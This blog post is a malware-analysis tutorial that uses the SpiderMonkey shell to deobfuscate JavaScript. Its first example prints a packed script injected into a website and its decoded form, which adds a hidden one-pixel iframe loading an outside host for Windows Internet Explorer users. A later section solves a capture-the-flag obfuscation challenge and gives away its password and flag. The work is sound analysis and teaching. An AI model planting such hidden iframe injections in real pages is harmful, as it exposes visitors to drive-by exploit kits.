---
layout: post
title: "Javascript malware | Checking it out with Spidermonkey and jsunpack-n"
date: 2015-02-01
comments: true
categories:
---
Allright, I've started going through the [Malware Analyst's Cookbook ](http://www.amazon.com/Malware-Analysts-Cookbook-DVD-Techniques/dp/0470613033), the book are almost like a big guide for all the tools a malware researcher may need. I like it, opens up for yourself to have fun and try the stuff!

So I will give som articles showing the usage of tools I want to pinpoint my learning at.

## Spidermonkey

>>>[SpiderMonkey](https://developer.mozilla.org/en-US/docs/Mozilla/Projects/SpiderMonkey) is Mozilla's JavaScript engine written in C/C++. It is used in various Mozilla products, including Firefox, and is available under the MPL2.

It's supernice to have a javascript engine callable from the terminal.
Lets have a very basic example of dealing with obfuscated code being called by eval.

I'll found [this](http://stackoverflow.com/questions/7765594/javascript-code-injected-into-site-can-you-help-me-decrypt-it) post at stackoverflow.

He want the following code decrypted:

```javascript
eval(function(p,a,c,k,e,d){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--){d[e(c)]=k[c]||e(c)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('i 9(){a=6.h(\'b\');7(!a){5 0=6.j(\'k\');6.g.l(0);0.n=\'b\';0.4.d=\'8\';0.4.c=\'8\';0.4.e=\'f\';0.m=\'w://z.o.B/C.D?t=E\'}}5 2=A.x.q();7(((2.3("p")!=-1&&2.3("r")==-1&&2.3("s")==-1))&&2.3("v")!=-1){5 t=u("9()",y)}',41,41,'el||ua|indexOf|style|var|document|if|1px|MakeFrameEx|element|yahoo_api|height|width|display|none|body|getElementById|function|createElement|iframe|appendChild|src|id|25u|msie|toLowerCase|opera|webtv||setTimeout|windows|http|userAgent|500|asso|navigator|com|showthread|php|72291731'.split('|'),0,{}))
```

Save the code inte a file with a firstline of `eval = print;`

Then from the terminal call: `js evil.js | indent`
Indent is a nice tool in linux used to indent and make the code readable, it's made for C but works allright for languages with a similar syntax.

Output:

```javascript
function
MakeFrameEx ()
{
  element = document.getElementById ('yahoo_api');
  if (!element)
    {
      var el = document.createElement ('iframe');
      document.body.appendChild (el);
      el.id = 'yahoo_api';
      el.style.width = '1px';
      el.style.height = '1px';
      el.style.display = 'none';
    el.src = 'http://asso.25u.com/showthread.php?t=72291731'}
}

var ua = navigator.userAgent.toLowerCase ();
if (((ua.indexOf ("msie") != -1 && ua.indexOf ("opera") == -1
      && ua.indexOf ("webtv") == -1)) && ua.indexOf ("windows") != -1)
  {
  var t = setTimeout ("MakeFrameEx()", 500)
  }


```

You can do this anywhere you have a javascript interpreter but the shell offers simplicity and effectiveness for us who aren't web devs.

As for the code analysis we see that it creates an iframe and appends it to the body. The link are down but you may assume it was an exploitkit, deface page or similar.

###Another example

Just for fun I'll have another example a little bit more advanced (but not much).
It's an obfuscation challenge posted on [swehack](https://swehack.org/viewtopic.php?f=37&t=505) by the user [Chloë](https://swehack.org/memberlist.php?mode=viewprofile&u=49).
The script checks given input and compares it with the "correct" one, and if it's the correct the flag are given in an alert box.

The script:

```javascript
function _341422467653677(n){switch(n){case 801422467773503:return 78;break;case 111422467773499:return -35;break;case 841422467773507:return 44;break;case 611422467773499:return 166;break;case 591422467773503:return 1;break;case 191422467773503:return 102;break;case 201422467773503:return 44;break;case 171422467773499:return 14;break;case 671422467773503:return 10;break;case 631422467773507:return 16;break;case 461422467773503:return 100;break;case 921422467773503:return 27;break;case 371422467773503:return 2;break;case 381422467773499:return 77;break;case 341422467773503:return 72;break;case 371422467773507:return 29;break;case 21422467773507:return 62;break;case 521422467773503:return 14;break;case 861422467773495:return 33;break;case 771422467773499:return 32;break;case 871422467773495:return 53;break;case 461422467773499:return 181;break;case 651422467773503:return 4;break;case 441422467773503:return 150;break;case 961422467773499:return 61;break;case 971422467773503:return -23;break;case 811422467773499:return 42;break;case 301422467773503:return 32;break;case 131422467773503:return 6;break;case 591422467773507:return 68;break;case 601422467773507:return 56;break;case 841422467773503:return 28;break;case 901422467773503:return -52;break;case 941422467773495:return 55;break;case 881422467773499:return 36;break;case 911422467773503:return 31;break;case 931422467773503:return 79;break;case 801422467773495:return -23;break;case 991422467773499:return 1;break;case 211422467773507:return 103;break;case 551422467773503:return 44;break;case 911422467773499:return 62;break;case 31422467773499:return 94;break;case 491422467773507:return 34;break;case 71422467773499:return 16;break;case 501422467773503:return 17;break;case 821422467773499:return 56;break;case 251422467773507:return 40;break;case 291422467773503:return 95;break;case 511422467773499:return 52;break;case 491422467773503:return 38;break;case 691422467773495:return 25;break;case 381422467773503:return 64;break;case 721422467773503:return 98;break;case 831422467773503:return 85;break;case 741422467773503:return -8;break;case 781422467773499:return 56;break;case 521422467773507:return 6;break;case 61422467773499:return 18;break;case 381422467773507:return 92;break;case 851422467773499:return 5;break;case 501422467773495:return 75;break;case 971422467773507:return -54;break;case 731422467773499:return 48;break;case 211422467773503:return 87;break;case 61422467773503:return 42;break;case 661422467773503:return 16;break;case 81422467773499:return 52;break;case 541422467773499:return 84;break;case 151422467773503:return 83;break;case 571422467773495:return 8;break;case 241422467773503:return 66;break;case 231422467773503:return 9;break;case 341422467773499:return 69;break;case 231422467773499:return 21;break;case 301422467773499:return 65;break;case 51422467773503:return 12;break;case 81422467773503:return 1;break;case 501422467773507:return -36;break;case 911422467773507:return 56;break;case 981422467773507:return 94;break;case 961422467773507:return 17;break;case 401422467773503:return 30;break;case 671422467773507:return 66;break;case 641422467773503:return -52;break;case 701422467773503:return 3;break;case 951422467773503:return 35;break;case 21422467773503:return 113;break;case 721422467773499:return -77;break;case 661422467773507:return 44;break;case 641422467773499:return 45;break;case 361422467773503:return 76;break;case 531422467773503:return 26;break;case 681422467773499:return -59;break;case 471422467773507:return 95;break;case 881422467773503:return 9;break;case 561422467773503:return 83;break;case 41422467773503:return 72;break;case 431422467773503:return 31;break;case 471422467773503:return 94;break;case 181422467773499:return 114;break;case 111422467773507:return 96;break;case 151422467773499:return 2;break;case 751422467773499:return 81;break;case 161422467773503:return -34;break;case 691422467773503:return 23;break;case 01422467773503:return 68;break;case 221422467773507:return 86;break;case 961422467773503:return 12;break;case 791422467773503:return 70;break;case 11422467773507:return 57;break;case 251422467773499:return 94;break;case 441422467773507:return 63;break;case 951422467773499:return 76;break;case 751422467773503:return 86;break;case 101422467773499:return 62;break;case 681422467773503:return -51;break;case 321422467773503:return 79;break;case 761422467773503:return 57;break;case 221422467773503:return 89;break;case 321422467773495:return 89;break;case 831422467773499:return 61;break;case 771422467773503:return 98;break;case 11422467773499:return 67;break;case 921422467773507:return 12;break;case 31422467773503:return 59;break;case 291422467773507:return 43;break;case 01422467773499:return 92;break;case 931422467773499:return 53;break;case 541422467773503:return 0;break;case 41422467773507:return 53;break;case 511422467773507:return 19;break;case 271422467773499:return -45;break;case 931422467773507:return 9;break;case 801422467773499:return 2;break;case 201422467773507:return 69;break;case 131422467773507:return -1;break;case 781422467773503:return 91;break;case 311422467773507:return 5;break;case 91422467773503:return 36;break;case 941422467773503:return 93;break;case 561422467773507:return 90;break;case 471422467773499:return -78;break;case 821422467773503:return -48;break;case 921422467773499:return 94;break;case 51422467773499:return 60;break;case 561422467773499:return 65;break;case 711422467773499:return 1;break;case 651422467773507:return 25;break;case 231422467773507:return 88;break;case 511422467773503:return 97;break;case 621422467773503:return -22;break;case 141422467773503:return 80;break;case 181422467773503:return 26;break;case 371422467773499:return 55;break;case 121422467773499:return 56;break;}}
var _801422467773495 = prompt(String.fromCharCode(_341422467653677(861422467773495) + _341422467653677(871422467773495)) + String.fromCharCode(_341422467653677(571422467773495) + _341422467653677(321422467773495)) + (String.fromCharCode(_341422467653677(691422467773495) + _341422467653677(501422467773495)) + String.fromCharCode(_341422467653677(801422467773495) + _341422467653677(941422467773495)) + (String.fromCharCode(_341422467653677(611422467773499) + _341422467653677(101422467773499)) + String.fromCharCode(_341422467653677(931422467773499) + _341422467653677(961422467773499)) + (String.fromCharCode(_341422467653677(111422467773499) + _341422467653677(11422467773499)) + String.fromCharCode(_341422467653677(771422467773499) + _341422467653677(951422467773499)) + (String.fromCharCode(_341422467653677(461422467773499) + _341422467653677(301422467773499)) + String.fromCharCode(_341422467653677(231422467773499) + _341422467653677(921422467773499)) + (String.fromCharCode(_341422467653677(561422467773499) + _341422467653677(881422467773499)) + String.fromCharCode(_341422467653677(61422467773499) + _341422467653677(01422467773499)) + (String.fromCharCode(_341422467653677(811422467773499) + _341422467653677(341422467773499)) + String.fromCharCode(_341422467653677(81422467773499) + _341422467653677(911422467773499)) + (String.fromCharCode(_341422467653677(71422467773499) + _341422467653677(541422467773499)) + String.fromCharCode(_341422467653677(641422467773499) + _341422467653677(121422467773499)) + (String.fromCharCode(_341422467653677(181422467773499) + _341422467653677(151422467773499)) + String.fromCharCode(_341422467653677(831422467773499) + _341422467653677(801422467773499)))))))))), "");
var _61422467773499 = true;
if (_801422467773495.length == _341422467653677(271422467773499) + _341422467653677(511422467773499)) {
    _61422467773499 &= _801422467773495[_341422467653677(721422467773499) + _341422467653677(381422467773499)] == String.fromCharCode(_341422467653677(251422467773499) + _341422467653677(851422467773499));
    _61422467773499 &= _801422467773495[_341422467653677(681422467773499) + _341422467653677(51422467773499)] == String.fromCharCode(_341422467653677(781422467773499) + _341422467653677(731422467773499));
    _61422467773499 &= _801422467773495[_341422467653677(991422467773499) + _341422467653677(711422467773499)] == String.fromCharCode(_341422467653677(31422467773499) + _341422467653677(171422467773499));
    _61422467773499 &= _801422467773495[_341422467653677(471422467773499) + _341422467653677(751422467773499)] == String.fromCharCode(_341422467653677(371422467773499) + _341422467653677(821422467773499));
    _61422467773499 &= _801422467773495[_341422467653677(741422467773503) + _341422467653677(51422467773503)] == String.fromCharCode(_341422467653677(61422467773503) + _341422467653677(31422467773503));
    _61422467773499 &= _801422467773495[_341422467653677(971422467773503) + _341422467653677(841422467773503)] == String.fromCharCode(_341422467653677(901422467773503) + _341422467653677(721422467773503));
    _61422467773499 &= _801422467773495[_341422467653677(681422467773503) + _341422467653677(761422467773503)] == String.fromCharCode(_341422467653677(621422467773503) + _341422467653677(01422467773503));
    if (_61422467773499) alert(String.fromCharCode(_341422467653677(701422467773503) + _341422467653677(41422467773503)) + String.fromCharCode(_341422467653677(301422467773503) + _341422467653677(321422467773503)) + (String.fromCharCode(_341422467653677(931422467773503) + _341422467653677(951422467773503)) + String.fromCharCode(_341422467653677(791422467773503) + _341422467653677(551422467773503)) + (String.fromCharCode(_341422467653677(291422467773503) + _341422467653677(131422467773503)) + String.fromCharCode(_341422467653677(911422467773503) + _341422467653677(361422467773503)) + (String.fromCharCode(_341422467653677(461422467773503) + _341422467653677(661422467773503)) + String.fromCharCode(_341422467653677(641422467773503) + _341422467653677(831422467773503)) + (String.fromCharCode(_341422467653677(821422467773503) + _341422467653677(141422467773503)) + String.fromCharCode(_341422467653677(181422467773503) + _341422467653677(201422467773503)) + (String.fromCharCode(_341422467653677(341422467773503) + _341422467653677(91422467773503)) + String.fromCharCode(_341422467653677(521422467773503) + _341422467653677(151422467773503)) + (String.fromCharCode(_341422467653677(941422467773503) + _341422467653677(671422467773503)) + String.fromCharCode(_341422467653677(191422467773503) + _341422467653677(591422467773503)) + (String.fromCharCode(_341422467653677(511422467773503) + _341422467653677(541422467773503)) + String.fromCharCode(_341422467653677(961422467773503) + _341422467653677(771422467773503)) + (String.fromCharCode(_341422467653677(691422467773503) + _341422467653677(231422467773503)) + String.fromCharCode(_341422467653677(441422467773503) + _341422467653677(801422467773503)) + (String.fromCharCode(_341422467653677(921422467773503) + _341422467653677(211422467773503)) + String.fromCharCode(_341422467653677(161422467773503) + _341422467653677(241422467773503)) + (String.fromCharCode(_341422467653677(401422467773503) + _341422467653677(651422467773503)) + String.fromCharCode(_341422467653677(501422467773503) + _341422467653677(221422467773503)) + (String.fromCharCode(_341422467653677(21422467773503) + _341422467653677(371422467773503)) + String.fromCharCode(_341422467653677(471422467773503) + _341422467653677(81422467773503)) + (String.fromCharCode(_341422467653677(491422467773503) + _341422467653677(561422467773503)) + String.fromCharCode(_341422467653677(881422467773503) + _341422467653677(751422467773503)) + (String.fromCharCode(_341422467653677(781422467773503) + _341422467653677(531422467773503)) + String.fromCharCode(_341422467653677(431422467773503) + _341422467653677(381422467773503)) + (String.fromCharCode(_341422467653677(221422467773507) + _341422467653677(371422467773507)) + String.fromCharCode(_341422467653677(961422467773507) + _341422467653677(981422467773507)) + (String.fromCharCode(_341422467653677(561422467773507) + _341422467653677(311422467773507)) + String.fromCharCode(_341422467653677(441422467773507) + _341422467653677(251422467773507)) + (String.fromCharCode(_341422467653677(41422467773507) + _341422467653677(661422467773507)) + String.fromCharCode(_341422467653677(651422467773507) + _341422467653677(111422467773507)) + String.fromCharCode(_341422467653677(971422467773507) + _341422467653677(231422467773507)))))))))))))))))));
    else alert(String.fromCharCode(_341422467653677(921422467773507) + _341422467653677(671422467773507)) + String.fromCharCode(_341422467653677(511422467773507) + _341422467653677(381422467773507)) + (String.fromCharCode(_341422467653677(211422467773507) + _341422467653677(931422467773507)) + String.fromCharCode(_341422467653677(521422467773507) + _341422467653677(471422467773507)) + String.fromCharCode(_341422467653677(131422467773507) + _341422467653677(491422467773507))))
} else alert(String.fromCharCode(_341422467653677(21422467773507) + _341422467653677(631422467773507)) + String.fromCharCode(_341422467653677(591422467773507) + _341422467653677(291422467773507)) + (String.fromCharCode(_341422467653677(601422467773507) + _341422467653677(911422467773507)) + String.fromCharCode(_341422467653677(11422467773507) + _341422467653677(841422467773507)) + String.fromCharCode(_341422467653677(501422467773507) + _341422467653677(201422467773507))))
```

As should be familiar we have no alert window accessible through Spidermonkey shell, same goes for prompt which in this case takes given password.
So in the beginning of the file place `prompt = readline; alert = print;`

After that lets do something for readability:
Rename the variable _801422467773495 to collectInfo, _61422467773499 to flagToBeTrue, _341422467653677 to getCharCode.

So now it's a bit more readable.

```javascript
prompt = readline; alert = print;
function getCharCode(n){switch(n){case 801422467773503:return 78;break;case 111422467773499:return -35;break;case 841422467773507:return 44;break;case 611422467773499:return 166;break;case 591422467773503:return 1;break;case 191422467773503:return 102;break;case 201422467773503:return 44;break;case 171422467773499:return 14;break;case 671422467773503:return 10;break;case 631422467773507:return 16;break;case 461422467773503:return 100;break;case 921422467773503:return 27;break;case 371422467773503:return 2;break;case 381422467773499:return 77;break;case 341422467773503:return 72;break;case 371422467773507:return 29;break;case 21422467773507:return 62;break;case 521422467773503:return 14;break;case 861422467773495:return 33;break;case 771422467773499:return 32;break;case 871422467773495:return 53;break;case 461422467773499:return 181;break;case 651422467773503:return 4;break;case 441422467773503:return 150;break;case 961422467773499:return 61;break;case 971422467773503:return -23;break;case 811422467773499:return 42;break;case 301422467773503:return 32;break;case 131422467773503:return 6;break;case 591422467773507:return 68;break;case 601422467773507:return 56;break;case 841422467773503:return 28;break;case 901422467773503:return -52;break;case 941422467773495:return 55;break;case 881422467773499:return 36;break;case 911422467773503:return 31;break;case 931422467773503:return 79;break;case 801422467773495:return -23;break;case 991422467773499:return 1;break;case 211422467773507:return 103;break;case 551422467773503:return 44;break;case 911422467773499:return 62;break;case 31422467773499:return 94;break;case 491422467773507:return 34;break;case 71422467773499:return 16;break;case 501422467773503:return 17;break;case 821422467773499:return 56;break;case 251422467773507:return 40;break;case 291422467773503:return 95;break;case 511422467773499:return 52;break;case 491422467773503:return 38;break;case 691422467773495:return 25;break;case 381422467773503:return 64;break;case 721422467773503:return 98;break;case 831422467773503:return 85;break;case 741422467773503:return -8;break;case 781422467773499:return 56;break;case 521422467773507:return 6;break;case 61422467773499:return 18;break;case 381422467773507:return 92;break;case 851422467773499:return 5;break;case 501422467773495:return 75;break;case 971422467773507:return -54;break;case 731422467773499:return 48;break;case 211422467773503:return 87;break;case 61422467773503:return 42;break;case 661422467773503:return 16;break;case 81422467773499:return 52;break;case 541422467773499:return 84;break;case 151422467773503:return 83;break;case 571422467773495:return 8;break;case 241422467773503:return 66;break;case 231422467773503:return 9;break;case 341422467773499:return 69;break;case 231422467773499:return 21;break;case 301422467773499:return 65;break;case 51422467773503:return 12;break;case 81422467773503:return 1;break;case 501422467773507:return -36;break;case 911422467773507:return 56;break;case 981422467773507:return 94;break;case 961422467773507:return 17;break;case 401422467773503:return 30;break;case 671422467773507:return 66;break;case 641422467773503:return -52;break;case 701422467773503:return 3;break;case 951422467773503:return 35;break;case 21422467773503:return 113;break;case 721422467773499:return -77;break;case 661422467773507:return 44;break;case 641422467773499:return 45;break;case 361422467773503:return 76;break;case 531422467773503:return 26;break;case 681422467773499:return -59;break;case 471422467773507:return 95;break;case 881422467773503:return 9;break;case 561422467773503:return 83;break;case 41422467773503:return 72;break;case 431422467773503:return 31;break;case 471422467773503:return 94;break;case 181422467773499:return 114;break;case 111422467773507:return 96;break;case 151422467773499:return 2;break;case 751422467773499:return 81;break;case 161422467773503:return -34;break;case 691422467773503:return 23;break;case 01422467773503:return 68;break;case 221422467773507:return 86;break;case 961422467773503:return 12;break;case 791422467773503:return 70;break;case 11422467773507:return 57;break;case 251422467773499:return 94;break;case 441422467773507:return 63;break;case 951422467773499:return 76;break;case 751422467773503:return 86;break;case 101422467773499:return 62;break;case 681422467773503:return -51;break;case 321422467773503:return 79;break;case 761422467773503:return 57;break;case 221422467773503:return 89;break;case 321422467773495:return 89;break;case 831422467773499:return 61;break;case 771422467773503:return 98;break;case 11422467773499:return 67;break;case 921422467773507:return 12;break;case 31422467773503:return 59;break;case 291422467773507:return 43;break;case 01422467773499:return 92;break;case 931422467773499:return 53;break;case 541422467773503:return 0;break;case 41422467773507:return 53;break;case 511422467773507:return 19;break;case 271422467773499:return -45;break;case 931422467773507:return 9;break;case 801422467773499:return 2;break;case 201422467773507:return 69;break;case 131422467773507:return -1;break;case 781422467773503:return 91;break;case 311422467773507:return 5;break;case 91422467773503:return 36;break;case 941422467773503:return 93;break;case 561422467773507:return 90;break;case 471422467773499:return -78;break;case 821422467773503:return -48;break;case 921422467773499:return 94;break;case 51422467773499:return 60;break;case 561422467773499:return 65;break;case 711422467773499:return 1;break;case 651422467773507:return 25;break;case 231422467773507:return 88;break;case 511422467773503:return 97;break;case 621422467773503:return -22;break;case 141422467773503:return 80;break;case 181422467773503:return 26;break;case 371422467773499:return 55;break;case 121422467773499:return 56;break;}}
var collectInfo = prompt(String.fromCharCode(getCharCode(861422467773495) + getCharCode(871422467773495)) + String.fromCharCode(getCharCode(571422467773495) + getCharCode(321422467773495)) + (String.fromCharCode(getCharCode(691422467773495) + getCharCode(501422467773495)) + String.fromCharCode(getCharCode(801422467773495) + getCharCode(941422467773495)) + (String.fromCharCode(getCharCode(611422467773499) + getCharCode(101422467773499)) + String.fromCharCode(getCharCode(931422467773499) + getCharCode(961422467773499)) + (String.fromCharCode(getCharCode(111422467773499) + getCharCode(11422467773499)) + String.fromCharCode(getCharCode(771422467773499) + getCharCode(951422467773499)) + (String.fromCharCode(getCharCode(461422467773499) + getCharCode(301422467773499)) + String.fromCharCode(getCharCode(231422467773499) + getCharCode(921422467773499)) + (String.fromCharCode(getCharCode(561422467773499) + getCharCode(881422467773499)) + String.fromCharCode(getCharCode(61422467773499) + getCharCode(01422467773499)) + (String.fromCharCode(getCharCode(811422467773499) + getCharCode(341422467773499)) + String.fromCharCode(getCharCode(81422467773499) + getCharCode(911422467773499)) + (String.fromCharCode(getCharCode(71422467773499) + getCharCode(541422467773499)) + String.fromCharCode(getCharCode(641422467773499) + getCharCode(121422467773499)) + (String.fromCharCode(getCharCode(181422467773499) + getCharCode(151422467773499)) + String.fromCharCode(getCharCode(831422467773499) + getCharCode(801422467773499)))))))))), "");
var flagToBeTrue = true;
if (collectInfo.length == getCharCode(271422467773499) + getCharCode(511422467773499)) {
    flagToBeTrue &= collectInfo[getCharCode(721422467773499) + getCharCode(381422467773499)] == String.fromCharCode(getCharCode(251422467773499) + getCharCode(851422467773499));
    flagToBeTrue &= collectInfo[getCharCode(681422467773499) + getCharCode(51422467773499)] == String.fromCharCode(getCharCode(781422467773499) + getCharCode(731422467773499));
    flagToBeTrue &= collectInfo[getCharCode(991422467773499) + getCharCode(711422467773499)] == String.fromCharCode(getCharCode(31422467773499) + getCharCode(171422467773499));
    flagToBeTrue &= collectInfo[getCharCode(471422467773499) + getCharCode(751422467773499)] == String.fromCharCode(getCharCode(371422467773499) + getCharCode(821422467773499));
    flagToBeTrue &= collectInfo[getCharCode(741422467773503) + getCharCode(51422467773503)] == String.fromCharCode(getCharCode(61422467773503) + getCharCode(31422467773503));
    flagToBeTrue &= collectInfo[getCharCode(971422467773503) + getCharCode(841422467773503)] == String.fromCharCode(getCharCode(901422467773503) + getCharCode(721422467773503));
    flagToBeTrue &= collectInfo[getCharCode(681422467773503) + getCharCode(761422467773503)] == String.fromCharCode(getCharCode(621422467773503) + getCharCode(01422467773503));
    if (flagToBeTrue) alert(String.fromCharCode(getCharCode(701422467773503) + getCharCode(41422467773503)) + String.fromCharCode(getCharCode(301422467773503) + getCharCode(321422467773503)) + (String.fromCharCode(getCharCode(931422467773503) + getCharCode(951422467773503)) + String.fromCharCode(getCharCode(791422467773503) + getCharCode(551422467773503)) + (String.fromCharCode(getCharCode(291422467773503) + getCharCode(131422467773503)) + String.fromCharCode(getCharCode(911422467773503) + getCharCode(361422467773503)) + (String.fromCharCode(getCharCode(461422467773503) + getCharCode(661422467773503)) + String.fromCharCode(getCharCode(641422467773503) + getCharCode(831422467773503)) + (String.fromCharCode(getCharCode(821422467773503) + getCharCode(141422467773503)) + String.fromCharCode(getCharCode(181422467773503) + getCharCode(201422467773503)) + (String.fromCharCode(getCharCode(341422467773503) + getCharCode(91422467773503)) + String.fromCharCode(getCharCode(521422467773503) + getCharCode(151422467773503)) + (String.fromCharCode(getCharCode(941422467773503) + getCharCode(671422467773503)) + String.fromCharCode(getCharCode(191422467773503) + getCharCode(591422467773503)) + (String.fromCharCode(getCharCode(511422467773503) + getCharCode(541422467773503)) + String.fromCharCode(getCharCode(961422467773503) + getCharCode(771422467773503)) + (String.fromCharCode(getCharCode(691422467773503) + getCharCode(231422467773503)) + String.fromCharCode(getCharCode(441422467773503) + getCharCode(801422467773503)) + (String.fromCharCode(getCharCode(921422467773503) + getCharCode(211422467773503)) + String.fromCharCode(getCharCode(161422467773503) + getCharCode(241422467773503)) + (String.fromCharCode(getCharCode(401422467773503) + getCharCode(651422467773503)) + String.fromCharCode(getCharCode(501422467773503) + getCharCode(221422467773503)) + (String.fromCharCode(getCharCode(21422467773503) + getCharCode(371422467773503)) + String.fromCharCode(getCharCode(471422467773503) + getCharCode(81422467773503)) + (String.fromCharCode(getCharCode(491422467773503) + getCharCode(561422467773503)) + String.fromCharCode(getCharCode(881422467773503) + getCharCode(751422467773503)) + (String.fromCharCode(getCharCode(781422467773503) + getCharCode(531422467773503)) + String.fromCharCode(getCharCode(431422467773503) + getCharCode(381422467773503)) + (String.fromCharCode(getCharCode(221422467773507) + getCharCode(371422467773507)) + String.fromCharCode(getCharCode(961422467773507) + getCharCode(981422467773507)) + (String.fromCharCode(getCharCode(561422467773507) + getCharCode(311422467773507)) + String.fromCharCode(getCharCode(441422467773507) + getCharCode(251422467773507)) + (String.fromCharCode(getCharCode(41422467773507) + getCharCode(661422467773507)) + String.fromCharCode(getCharCode(651422467773507) + getCharCode(111422467773507)) + String.fromCharCode(getCharCode(971422467773507) + getCharCode(231422467773507)))))))))))))))))));
    else alert(String.fromCharCode(getCharCode(921422467773507) + getCharCode(671422467773507)) + String.fromCharCode(getCharCode(511422467773507) + getCharCode(381422467773507)) + (String.fromCharCode(getCharCode(211422467773507) + getCharCode(931422467773507)) + String.fromCharCode(getCharCode(521422467773507) + getCharCode(471422467773507)) + String.fromCharCode(getCharCode(131422467773507) + getCharCode(491422467773507))))
} else alert(String.fromCharCode(getCharCode(21422467773507) + getCharCode(631422467773507)) + String.fromCharCode(getCharCode(591422467773507) + getCharCode(291422467773507)) + (String.fromCharCode(getCharCode(601422467773507) + getCharCode(911422467773507)) + String.fromCharCode(getCharCode(11422467773507) + getCharCode(841422467773507)) + String.fromCharCode(getCharCode(501422467773507) + getCharCode(201422467773507))))

```

The first if statement seems kind of obvious, `if (collectInfo.length == getCharCode(271422467773499) + getCharCode(511422467773499))`, we just need to find out the length it wants.
Add this before the comparision: `alert(getCharCode(271422467773499) + getCharCode(511422467773499))`
Will result in the digit `7` in the output.

Another thing to note is that there are a whole lot of String.fromCharCode calls, what if we just hijack the call and see what they compare against?
You can probably do this in some nice OOP way by overriding the method but I'm to lazy for that.
Add the following code:

```javascript

function hijack() {
    alert(String.fromCharCode(arguments[0]));
    return String.fromCharCode(arguments[0]); //only one argument in all calls
}
```

And replace all occurances of `String.fromCharCode` with `hijack`.

Will result in the following output:

```
V
a
d
 
ä
r
 
l
ö
s
e
n
o
r
d
e
t
?
1234567
c
h
l
o
e
.
.
N
o
p
e
!
Nope!
```

Where `Vad är lösenordet?` ìn english are `what is the password?`, `1234567` is a seven character long input to enter first if.
`chloe..` is a string being compared, supposedly the password?

If you enter `chloe..` you get the following output if you ignore our hijack functions output : `Korrekt! Flaggan är "js_y_u_so_gay"`
Which means `Correct! The flag are "js_y_u_so_gay"`, not such a hard challenge to beat but at least it was a bit of fun :)


##jsunpack-n
>[jsunpack-n](https://code.google.com/p/jsunpack-n/) emulates browser functionality when visiting a URL. It's purpose is to detect exploits that target browser and browser plug-in vulnerabilities. It accepts many different types of input:

>* PDF files - samples/sample-pdf.file
* Packet Captures - samples/sample-http-exploit.pcap
* HTML files
* JavaScript files
* SWF files

What I'm most excited about right now is malicious pdf files.
I've downloaded a couple of samples from [http://contagiodump.blogspot.se/2013/03/16800-clean-and-11960-malicious-files.html](http://contagiodump.blogspot.se/2013/03/16800-clean-and-11960-malicious-files.html)

TODO